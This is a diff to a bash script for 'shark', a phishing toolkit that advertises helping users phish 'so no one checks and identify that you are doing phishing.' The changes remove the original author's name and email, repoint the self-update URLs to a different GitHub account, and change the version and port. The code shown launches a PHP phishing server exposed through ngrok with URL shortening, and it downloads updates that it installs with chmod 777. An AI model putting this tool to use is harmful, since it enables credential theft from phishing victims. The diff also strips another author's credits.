@@ -3,11 +3,8 @@
 ##############################################
 #                                            #
 #             PROJECT: SHARK                 #
-#             AUTHOR: ASHISH                 #
-#              SHARK ©2021                   #
-#     EMAIL: ashishsingh103020@gmail.com     #
-#           BEST PHISHING TOOLS              #              
-#       created by :- a s h i s h            #
+#              SHARK ©2021                   #         
+#           BEST PHISHING TOOLS              #                                
 #       Reborn by :- M r. D e r e K          #
 ##############################################
 
@@ -35,7 +32,7 @@ nc="\033[0m"                                                ##
 # VERSION
 ##########
 
-VERSION="2.0.4"
+VERSION="2.5"
 
 ################
 # PRINT MESSAGE
@@ -125,12 +122,12 @@ function os () {
 function main_update() {
 	launch="updating shark"
 	splashdown="updated shark";echo
-	os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	os;(wget -q https://github.com/tech2gamer/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 }
 
 
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
 		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
@@ -160,7 +157,7 @@ function connection() {
 
 function check_update() {	
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/tech2gamer/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
                 echo -e "\tReading \tpackage \tlists... \tDone
@@ -183,7 +180,6 @@ usage() {
 Usage: $(basename $0) [OPTIONS] available
 shark - future of phishing is here,
 A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
-Copyright 2020 <ashishsingh103020@gmail.com>
 Options:
   -u, --update      Update shark
   -v, --version     Display the current shark version installed on your device
@@ -381,7 +377,7 @@ main
 fi
 launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 elif [[ $drk == n || $drk == N ]]; then
-PORT="8080"
+PORT="8686"
 launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 else
 	echo
@@ -400,11 +396,7 @@ banner2() {
         ║${white}   ╔═╗┬─┐┌─┐┌┬┐┌─┐┌┐┌┌┬┐┬┌─┐┬  ┌─┐${green}  ║
         ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
         ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
-        ╚════════════════════════════════════╝
-     
-        Author    : ${white}Ashish Singh${green}
-        Github    : ${white}github.com/Bhaviktutorials${green}   
-        Publisher : ${white}Bhavik Oza${green}  
+        ╚════════════════════════════════
 	Reborn by : ${white}Mr.Derek(t2g)${green}
      
         >> ${white}${final_url}${green} 
@@ -528,7 +520,7 @@ do
        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ v ${VERSION} ${yellow}Reborn by Mr.Derek(t2g)\n\n "
 
       printf "${green}      ╔──────────────────────────────────────╗\n"
-      printf "${green}       |${white}    c r e a t e d  b y  a s h i s h ${green}  |\n"
+      printf "${green}       |${white}    R E B O R N   V E R S I O N   ${green}  |\n"
       printf "${green}       ╚──────────────────────────────────────╝\n\n"
 
      printf "           ${green}💻 \e[1;4;5;37mSelect An Attack To Deploy\e[0m${green} 💻\n\n"
@@ -774,8 +766,7 @@ done
 		  
 #####################################################################
 #                                                                   #
-#      simply changing this banner will not make you developer      #
-#                   CREATED BY ASHISH                               #
+#      simply changing this banner will not make you developer      #                                                  #
 #                   KEEP SUPPORTING                                 #
 #                      THANKYOU                                     #
 #                                                                   #
